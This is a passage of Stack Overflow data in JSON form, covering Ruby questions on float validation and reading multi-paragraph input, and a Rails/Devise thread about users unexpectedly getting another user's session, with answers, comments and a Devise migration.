integer. If the number is a valid number</p>\n\n<p>I have tried using <code>if valid_number?(apr) &amp;&amp; float?(apr)</code> which returns true for integers. </p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>def valid_number?(input)\n  integer?(input) || float?(input)\nend\n\ndef integer?(input)\n  /^\\d+$/.match(input)\nend\n\ndef float?(input)\n  /\\d/.match(input) &amp;&amp; /^\\d*\\.?\\d*$/.match(input)\nend\n\napr = gets.chomp\n\nif valid_number?(apr)\n  if float?(apr)\n    puts \"Is #{apr}% correct? Y or n\"\n  end\nend\n</code></pre>\n\n<p>I expect anything that does not contain a decimal to be false for the float? method, but if I don't put a decimal my program doesn't seem to care.</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 22377, "user_id": 2288659, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/bBg8v.png?s=128&g=1", "display_name": "Silvio Mayolo", "link": "https://stackoverflow.com/users/2288659/silvio-mayolo"}, "edited": false, "score": 0, "creation_date": 1558276252, "post_id": 56208712, "comment_id": 99038816, "body": "How do you want the user to indicate to you that they&#39;re done inputting paragraphs?"}, {"owner": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "reply_to_user": {"reputation": 22377, "user_id": 2288659, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/bBg8v.png?s=128&g=1", "display_name": "Silvio Mayolo", "link": "https://stackoverflow.com/users/2288659/silvio-mayolo"}, "edited": false, "score": 0, "creation_date": 1558277385, "post_id": 56208712, "comment_id": 99039106, "body": "if a user pastes in text already containing separate paragraphs, the paragraphs will still be separated by a new line. Pressing enter (after pasting the text) will end the input."}, {"owner": {"reputation": 22377, "user_id": 2288659, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/bBg8v.png?s=128&g=1", "display_name": "Silvio Mayolo", "link": "https://stackoverflow.com/users/2288659/silvio-mayolo"}, "edited": false, "score": 0, "creation_date": 1558277612, "post_id": 56208712, "comment_id": 99039158, "body": "In a console, a newline pasted in and a newline caused by the user pressing &#39;enter&#39; are indistinguishable. You&#39;ll need some kind of sentinel value. For instance, you could have the user type &quot;QUIT&quot; when they&#39;re done and look for that message, or you could have them hit enter twice in a row, provided the inputted text doesn&#39;t have any double newlines."}, {"owner": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "reply_to_user": {"reputation": 22377, "user_id": 2288659, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/bBg8v.png?s=128&g=1", "display_name": "Silvio Mayolo", "link": "https://stackoverflow.com/users/2288659/silvio-mayolo"}, "edited": false, "score": 0, "creation_date": 1558277926, "post_id": 56208712, "comment_id": 99039245, "body": "That sounds awesome!!!"}, {"owner": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "reply_to_user": {"reputation": 22377, "user_id": 2288659, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/bBg8v.png?s=128&g=1", "display_name": "Silvio Mayolo", "link": "https://stackoverflow.com/users/2288659/silvio-mayolo"}, "edited": false, "score": 0, "creation_date": 1558277940, "post_id": 56208712, "comment_id": 99039251, "body": "How would I do that?"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "edited": false, "score": 0, "creation_date": 1558278788, "post_id": 56209071, "comment_id": 99039500, "body": "is <code>p str</code> the same as `puts(str)?"}, {"owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "reply_to_user": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "edited": false, "score": 0, "creation_date": 1558279222, "post_id": 56209071, "comment_id": 99039639, "body": "<code>p</code> is short for <code>puts str.inspect</code>. <code>p</code> is a tool for you, the developer: Ruby, show me what this is."}, {"owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "reply_to_user": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "edited": false, "score": 0, "creation_date": 1558283604, "post_id": 56209071, "comment_id": 99040855, "body": "This can be shortened using the <code>$_</code> global variable: <code>str = &quot;&quot;; str &lt;&lt; gets until $_ == &quot;\\n&quot;</code>"}, {"owner": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "edited": false, "score": 0, "creation_date": 1558374697, "post_id": 56209071, "comment_id": 99072332, "body": "What if I want to also use the gets to delete any UTF-8 characters received by this gets...I dont exactly know how to use the <code>:encoding =&gt; &#39;UTF-8&#39;</code> code"}, {"owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "reply_to_user": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "edited": false, "score": 0, "creation_date": 1558376802, "post_id": 56209071, "comment_id": 99073141, "body": "All characters which you receive by <code>gets</code> are UTF-8 by default."}, {"owner": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "edited": false, "score": 0, "creation_date": 1558549001, "post_id": 56209071, "comment_id": 99141903, "body": "here is the full error: ...<code>:in `split&#39;: invalid byte sequence in US-ASCII (ArgumentError)</code>"}, {"owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "reply_to_user": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "edited": false, "score": 0, "creation_date": 1558558314, "post_id": 56209071, "comment_id": 99146005, "body": "@I_love_coffee This has really nothing to do with your original question. If you have a new question then formulate a new question. By doing so other people will be able to find it and perhaps learn from it."}], "tags": [], "owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "is_accepted": true, "score": 1, "last_activity_date": 1558278255, "creation_date": 1558278255, "answer_id": 56209071, "question_id": 56208712, "link": "https://stackoverflow.com/questions/56208712/how-do-i-receive-multiple-paragraphs-from-a-user-in-ruby2-6-3/56209071#56209071", "title": "How do I receive multiple paragraphs from a user in Ruby2.6.3?", "body": "<p>Add paragraphs to a string until the input consists of a empty line:</p>\n\n<pre><code>str  = \"\"\npara = \"init\"\nstr &lt;&lt; (para = gets) until para.chomp.empty? #or para == \"\\n\"\np str\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "is_accepted": false, "score": 0, "last_activity_date": 1558329665, "creation_date": 1558329665, "answer_id": 56214693, "question_id": 56208712, "link": "https://stackoverflow.com/questions/56208712/how-do-i-receive-multiple-paragraphs-from-a-user-in-ruby2-6-3/56214693#56214693", "title": "How do I receive multiple paragraphs from a user in Ruby2.6.3?", "body": "<p>Here's an alternative, with a slightly different logic</p>\n\n<pre><code>def getps\n  save, $/ = $/, \"\\n\\n\"\n  gets.chomp\nensure\n  $/ = save\nend\n\nstr = getps\n</code></pre>\n\n<p>The global variable <code>$/</code> is what Ruby uses to find out what line end is. <code>gets</code> gets things till line end. If we tell Ruby that line end is two newlines, then <code>gets</code> waits till we have two newlines in a row till it exits. Since we don't need them, we'll just chomp them off. The rest of the code is just to ensure that <code>$/</code> gets restored properly afterwards so normal <code>gets</code> is not messed up forever.</p>\n"}], "owner": {"reputation": 3, "user_id": 11523984, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EPg0mccaPs4/AAAAAAAAAAI/AAAAAAAAADc/6KKx4WdFUgc/photo.jpg?sz=128", "display_name": "I_love_coffee", "link": "https://stackoverflow.com/users/11523984/i-love-coffee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 56209071, "answer_count": 2, "score": 0, "last_activity_date": 1558329665, "creation_date": 1558275787, "question_id": 56208712, "link": "https://stackoverflow.com/questions/56208712/how-do-i-receive-multiple-paragraphs-from-a-user-in-ruby2-6-3", "title": "How do I receive multiple paragraphs from a user in Ruby2.6.3?", "body": "<p>I'm trying to receive multiple paragraphs at once from a user.</p>\n\n<p>I've tried using gets, but it doesn't seem to be working... it discards the second paragraph:</p>\n\n<pre><code>#The code:\n   print(\"Paste your text here: \") \n.. essay = gets \n.. puts(essay)\n\n# Getting user imput (the second sentance is a separate paragraph)\nPaste your text here:  I like cake.\n It makes me happy.\n\n# What the computer did for puts(essay):\nI like cake.\n=&gt; nil\n</code></pre>\n\n<p>I expected the result to be something like this:</p>\n\n<pre><code>\"I like cake.\\nIt makes me happy.\\n\"\n</code></pre>\n\n<p>But it gave me <code>\"I like cake.\"</code> instead.\nHow could I end up with my expected result?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "devise"], "comments": [{"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 2, "creation_date": 1558261309, "post_id": 56206556, "comment_id": 99035326, "body": "I experienced a similar problem years ago and we were able to find the root cause in a misconfigured database configuration. Multiple forked processes were using the same database connection and in very rare cases when loading a session one process got the session that was requested by another process. What session store do you use in your application?"}, {"owner": {"reputation": 3580, "user_id": 1680728, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/844cd73e8700d810d7cc207cba7da3bd?s=128&d=identicon&r=PG&f=1", "display_name": "Felix", "link": "https://stackoverflow.com/users/1680728/felix"}, "edited": false, "score": 0, "creation_date": 1558262113, "post_id": 56206556, "comment_id": 99035514, "body": "What exactly does &quot;real world&quot; mean? If it means that you yourself are testing your application on the same machine with the same browser (and e.g. multiple tabs), the &quot;error&quot; very likely stems from there. You can log in to the same app multiple times using a private tab/private window of your browser, or by using multiple different browsers (e.g. firefox and chromium)."}, {"owner": {"reputation": 691, "user_id": 4385342, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh3.googleusercontent.com/-ywHOrlzk5g4/AAAAAAAAAAI/AAAAAAAAB9Y/mO2q6r1jr60/photo.jpg?sz=128", "display_name": "a3y3", "link": "https://stackoverflow.com/users/4385342/a3y3"}, "edited": false, "score": 0, "creation_date": 1558282617, "post_id": 56206556, "comment_id": 99040594, "body": "Just putting in my 2 cents here: Devise allows you to have multiple models signed in at the same time if you configure it to do so. Maybe you can check that? <a href=\"https://github.com/plataformatec/devise#configuring-multiple-models\" rel=\"nofollow noreferrer\">github.com/plataformatec/devise#configuring-multiple-models</a>"}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "reply_to_user": {"reputation": 3580, "user_id": 1680728, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/844cd73e8700d810d7cc207cba7da3bd?s=128&d=identicon&r=PG&f=1", "display_name": "Felix", "link": "https://stackoverflow.com/users/1680728/felix"}, "edited": false, "score": 0, "creation_date": 1558293043, "post_id": 56206556, "comment_id": 99043435, "body": "@Felix - &quot;real world&quot; means multiple people using separate devices.  I had two people logged in on different devices and when they joined a game, one of them was now logged in as someone else - someone else who had been &quot;oauth&#39;d&quot; by Facebook, so it was quite a surprise."}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "reply_to_user": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558294765, "post_id": 56206556, "comment_id": 99043923, "body": "@spickermann - I haven&#39;t specified a session store, so I presume it&#39;s just using the browser cookies - and somehow it sends the wrong cookie to one of the browsers at some point, weirdly enough this is <i>not</i> happening at login.  Or else wherever the translation of session -&gt; identity is being corrupted."}, {"owner": {"reputation": 1066, "user_id": 6204421, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/0yeJN.jpg?s=128&g=1", "display_name": "Santosh Aryal", "link": "https://stackoverflow.com/users/6204421/santosh-aryal"}, "edited": false, "score": 0, "creation_date": 1558339675, "post_id": 56206556, "comment_id": 99053977, "body": "Could you please share your Devise Migration here..."}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "reply_to_user": {"reputation": 1066, "user_id": 6204421, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/0yeJN.jpg?s=128&g=1", "display_name": "Santosh Aryal", "link": "https://stackoverflow.com/users/6204421/santosh-aryal"}, "edited": false, "score": 0, "creation_date": 1558342337, "post_id": 56206556, "comment_id": 99055314, "body": "@SantoshAryal Devise migration added"}, {"owner": {"reputation": 851, "user_id": 1835311, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/f4a2491f6452be5c9a0269d63dadce66?s=128&d=identicon&r=PG", "display_name": "Jun Dalisay", "link": "https://stackoverflow.com/users/1835311/jun-dalisay"}, "edited": false, "score": 0, "creation_date": 1594276025, "post_id": 56206556, "comment_id": 111070118, "body": "I had a similar problem. The reason was that my UI was cached on the browser so even if the User X logged out and another User Y logged in, the UI of the previous User X would show to User Y."}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1594330650, "post_id": 56206556, "comment_id": 111097079, "body": "Jun - interesting possibility, although in this case it was two unique users on their own browsers that had not been shared and had not been used to login to any other users on this system."}, {"owner": {"reputation": 421, "user_id": 3210216, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a4c45dacf81fb7e781cd9db71720666c?s=128&d=identicon&r=PG", "display_name": "Ignacy Kasperowicz", "link": "https://stackoverflow.com/users/3210216/ignacy-kasperowicz"}, "edited": false, "score": 0, "creation_date": 1600105000, "post_id": 56206556, "comment_id": 112976941, "body": "Have you found a root cause by any chance? We are experiencing similar problems. I thought initially that it might be a thread safety issue but after going single thread multiple workers puma setup I can still rarely see that behavior. My setup is more complicated (eg includes JWT tokens) but surprisingly the issue related to sessions swap looks similar."}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1600110931, "post_id": 56206556, "comment_id": 112979230, "body": "I have not found a solution.  I think the only way to debug it would be to figure out a way to setup a &quot;multi-user&quot; testbench that can reliable see the switch happen, then start removing components.  I actually think it&#39;s something inside of devise even though it&#39;s &quot;battle tested&quot; - my bet is that it&#39;s a specific configuration that isn&#39;t getting good testing and is causing the problem.  I can&#39;t even figure out how I could create a bug in my current code that would cause this kind of id switching."}], "answers": [{"comments": [{"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558293290, "post_id": 56207220, "comment_id": 99043517, "body": "I don&#39;t have any static vars for the user - I use &quot;current_user&quot; to get and show the name info.  This isn&#39;t about a username uniqueness problem, someone actually went from being one user to another (&quot;Bob&quot; suddenly becomes &quot;Gerry&quot; and has access to everything &quot;Gerry&quot; has).   It&#39;s not email addresses either.  Most users are using oauth, and we only have about 100 users at this point.  I haven&#39;t edited the session handling."}, {"owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "reply_to_user": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558333267, "post_id": 56207220, "comment_id": 99051239, "body": "Mihgt tbe tricky to debug without seeing the code, without being able to reproduce."}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558334532, "post_id": 56207220, "comment_id": 99051705, "body": "I agree - that&#39;s why I was hoping for some devise experts who could tell me what kind of pathways could cause something like this.  I don&#39;t even fully know how devise stores the session, and/or when it sends new session info, or perhaps if there&#39;s some way to turn on devise logging."}, {"owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "reply_to_user": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558362404, "post_id": 56207220, "comment_id": 99066531, "body": "Devise uses the provided session. If you have not changed anything, then it will be cookie store. Key to fix it will be to reproduce it. Especially if you want to be sure that a potential fix actually fixes it. Write a script that hammers your server (locally could be enough, since it happened there as well) or so?"}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558402236, "post_id": 56207220, "comment_id": 99079784, "body": "Once I&#39;ve reproduced it, and see that the cookie has been changed, how do I find the source?"}, {"owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "reply_to_user": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558448066, "post_id": 56207220, "comment_id": 99099240, "body": "Sorry, can&#39;t help without seeing code. I understand that ths might be difficult. Perhaps you can find a way to reproduce and then strip down the app until you can share?"}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558465200, "post_id": 56207220, "comment_id": 99108067, "body": "I&#39;ll see how much the problem haunts me - that would be a massive undertaking."}, {"owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "reply_to_user": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 1, "creation_date": 1558508400, "post_id": 56207220, "comment_id": 99119431, "body": "This would scare me. If it happened once, it can happen again. And users seeing other users info is a huge security/privacy risk. First step is to be able to reproduce the problem. This you could do without sharing code. Just write a script that logs in and then requests profile info over and over again. Start it for multiple users and see if it leaks other session info."}, {"owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558642496, "post_id": 56207220, "comment_id": 99178593, "body": "And it scares me.  I&#39;ll look into automating some logins to devise, though I confess this is new territory for me, since this is my first devise project."}, {"owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "reply_to_user": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "edited": false, "score": 0, "creation_date": 1558677148, "post_id": 56207220, "comment_id": 99186044, "body": "As said, not sure this is related to devise. Honestly I don&#39;t use it that often but there are lots of people who do.  If you can share some code I can look over it."}], "tags": [], "owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "is_accepted": false, "score": 3, "last_activity_date": 1558322086, "last_edit_date": 1558322086, "creation_date": 1558264386, "answer_id": 56207220, "question_id": 56206556, "link": "https://stackoverflow.com/questions/56206556/user-is-getting-session-from-other-logged-in-user-with-rails-devise/56207220#56207220", "title": "User is getting session from other logged in user with Rails / Devise", "body": "<p>There are multiple ways this can happen, obviously it's hard to tell from here what is going wrong. Since Devise is battle tested, I'd assume it's something you do, rather than device is doing (of course it is still possible that Devise has a bug, but more likely your code is buggy) </p>\n\n<p>Do you have</p>\n\n<ul>\n<li>Static variables that hold information related to the user</li>\n<li>Usernames that are not unique (enforced on the DB level)</li>\n<li>Users with same email address created through different sign up mechanisms</li>\n<li>Changed anything in the session handling?\n?</li>\n</ul>\n\n<p>Can you find a way to reproduce the error locally? Perhaps with a script that logs in as different users and checks that the user stays the same.\nWhat Server does it happen with?\nWhat Session Store do you use?</p>\n"}], "owner": {"reputation": 2311, "user_id": 1795483, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/tDYbt.jpg?s=128&g=1", "display_name": "David Ljung Madison Stellar", "link": "https://stackoverflow.com/users/1795483/david-ljung-madison-stellar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 348, "favorite_count": 1, "answer_count": 1, "score": 5, "last_activity_date": 1558342435, "creation_date": 1558258720, "last_edit_date": 1558342435, "question_id": 56206556, "link": "https://stackoverflow.com/questions/56206556/user-is-getting-session-from-other-logged-in-user-with-rails-devise", "title": "User is getting session from other logged in user with Rails / Devise", "body": "<p>I'm using Devise with Ruby on Rails to develop a game.</p>\n\n<p>Users are able to login and join the game.</p>\n\n<p>When they first login, everything is fine - it shows that they are logged in as the expected person.</p>\n\n<p>But very rarely I have noticed (both in real world use as well as once in testing) a situation that boggles me.</p>\n\n<p>Suddenly one of the users \"becomes\" a different user.  As if they had logged in as the other user.  They have full access to their account, and Rails thinks that they have logged in as the different user.  Everything such as \"current_user.name\" and \"current_user.email\" are all according to the other user, the one that they were not previously logged in as, and a user they have no permission to become.</p>\n\n<p>I can't figure out where in my code this might be coming from.  I don't want to post the entirety of my code here, so I was hoping for some brainstorming of <em>how</em> it would even be possible to cause something like this to happen in my code - or am I more likely looking at a devise bug where devise is screwing up the session it returns under certain race conditions?</p>\n\n<p>The latter is somewhat scarier to deal with from a general security perspective for any site that uses devise, but I figure someone else would have seen this by now.  So I figure it must be in my code - but nowhere in my code do I touch the session info, nor do I ever do anything weird like assign the current_user to anything.</p>\n\n<p>To be very clear about what happens:</p>\n\n<ol>\n<li>\"Bob\" logs in on his device as \"Bob\" and sees that he is \"Bob\" (current_user.name) and has access to \"Bob\" things.</li>\n<li>\"Joe\" logs in on his device as \"Joe\" and sees that he is \"Joe\" (current_user.name) and has access to \"Joe\" things.</li>\n<li>After following one of any number of internal links (that don't alter/set user info), the device that \"Joe\" is using is now showing up as \"Bob\" (current_user.name) and has access to \"Bob\" things (like editing his profile page, etc.. - all guarded by current_user).</li>\n</ol>\n\n<p>Any thoughts on what I might be missing?</p>\n\n<p>My devise setup allows for email/password login as well as oauth login with Facebook and the like.</p>\n\n<p>--</p>\n\n<p>As requested, here is the devise migration:</p>\n\n<p>--</p>\n\n<pre><code>class DeviseCreateUsers &lt; ActiveRecord::Migration\n  def change\n    create_table(:users) do |t|\n      ## Database authenticatable\n      t.string :email,              null: false, default: \"\"\n      t.string :encrypted_password, null: false, default: \"\"\n\n      ## Recoverable\n      t.string   :reset_password_token\n      t.datetime :reset_password_sent_at\n\n      ## Rememberable\n      t.datetime :remember_created_at\n\n      ## Trackable\n      t.integer  :sign_in_count, default: 0, null: false\n      t.datetime :current_sign_in_at\n      t.datetime :last_sign_in_at\n      t.string   :current_sign_in_ip\n      t.string   :last_sign_in_ip\n\n      ## Confirmable\n      t.string   :confirmation_token\n      t.datetime :confirmed_at\n      t.datetime :confirmation_sent_at\n      t.string   :unconfirmed_email # Only if using reconfirmable\n\n      ## Lockable\n      # t.integer  :failed_attempts, default: 0, null: false # Only if lock strategy is :failed_attempts\n      # t.string   :unlock_token # Only if unlock strategy is :email or :both\n      # t.datetime :locked_at\n\n\n      t.timestamps\n    end\n\n    add_index :users, :email,                unique: true\n    add_index :users, :reset_password_token, unique: true\n    # add_index :users, :confirmation_token,   unique: true\n    # add_index :users, :unlock_token,         